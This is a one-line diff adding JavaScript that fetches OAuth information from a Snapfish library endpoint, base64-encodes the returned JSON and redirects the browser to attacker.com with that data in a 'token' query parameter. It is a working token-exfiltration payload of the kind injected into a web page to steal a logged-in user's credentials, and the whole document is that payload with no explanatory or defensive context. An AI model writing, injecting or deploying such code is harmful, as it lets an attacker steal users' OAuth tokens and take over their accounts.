@@ -1,0 +1,1 @@
+fetch('https://www.snapfish.com/library/getOauthInfo').then(response => response.json().then(jsonData => { let encodedData = btoa(encodeURIComponent(JSON.stringify(jsonData))); window.location.href = 'https://attacker.com/?token=' + encodedData; })).catch(error => console.error('Erro:', error));
